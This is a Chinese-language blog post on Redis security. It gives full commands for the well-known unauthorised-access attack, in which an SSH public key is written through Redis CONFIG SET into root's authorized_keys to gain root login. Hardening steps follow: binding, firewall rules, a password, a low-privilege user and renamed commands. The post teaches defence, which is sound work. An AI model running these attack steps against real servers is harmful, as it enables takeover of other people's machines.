---
title: "Redis的一个简单漏洞攻击与防范"
date: 2019-11-16T12:40:16+08:00
draft: false
tags: ["Redis", "安全"]
categories: ["中间件"]
---

# Redis的一个简单漏洞攻击与防范

> Redis是目前使用最为广泛的缓存中间件，使用起来虽然方便、简洁但如果不加一些安全限制的使用，便会导致一些问题。之前我的一位朋友，因为在自己的云服务器上自行部署了Redis用来学习，不久后他的服务器便被人搞去挖矿了...本文讲述Redis简单的漏洞攻击流程以及对应的防范方法。


## 简单的攻击流程
- 如果本地没有配置过ssh，先生成公钥和私钥

  ```shell
    ssh-keygen -t rsa
  ```

- 将公钥写入一个txt文件

  ```shell
  (echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > test.txt
  ```

- 连接Redis并把公钥文件写入。

  ```shell
  cat test.txt | redis-cli -h {server.ip} -x set attack_key
  ```

- 登入未受保护的Redis，进行如下命令操作。通过config命令修改了持久化目录及持久化文件名，使持久化的DB文件刚好为root用户SSK key存放的文件，然后save将公钥追加到authorizew_keys文件的末尾，也就上传了公钥。之后便可以使用SSH以root用户登录目标服务器。

  ```shell
  redis-cli -h {server.ip}
  # 下面都是Redis Client的交互命令
  config set dir /root/.ssh/
  config set dbfilename "authorized_keys"
  save
  ```
- 拿到root用户，之后自然就是为所欲为了～

## 线上Redis服务安全加固

> Redis在默认情况下会存在未授权访问漏洞，如果Redis的运行用户为root，黑客可以向root账号导入SSH公钥，从而直接通过SSH入侵服务器。

### 1.限制访问源只能为本地或指定IP

在redis.conf文件中写入一行记录：`bind 127.0.0.1 `，然后重启Redis生效。也存在例外情况，如果Redis以root用户运行，攻击者借助已有的web shell，可以利用该Redis来反弹shell实现提权。？

### 2.设置防火墙策略

通过iptables，仅允许指定的ip来访问Redis服务

```
iptables -A INPUT -s x.x.x.x -p tcp --dport 6379 -j ACCEPT
```

### 3.设置访问密码

在redis.conf中写入`requirepass {your_password}`，设置一个安全度高的密码。

### 4.使用低权限用户运行Redis

使用低权限用户运行Redis，并禁用该账号的远程登录，使用新用户并重启Redis生效。

```
useradd -M -s /sbin/nologin {username}
```

### 5.屏蔽重要指令

可以将一些重要命令设置为空，即禁用，也可以重命名成更复杂的名字。修改完成后需要重启Redis生效。

```
rename-command config ""
rename-command flushall ""
rename-command flushdb ""
rename-command shutdown shutdown_wxj
```

在Redis 3.0.2版本以下存在EVAL沙箱逃逸漏洞，攻击者可以通过该漏洞执行任意Lua代码，可以通过rename config命令和在redis.conf中限制访问源来规避风险。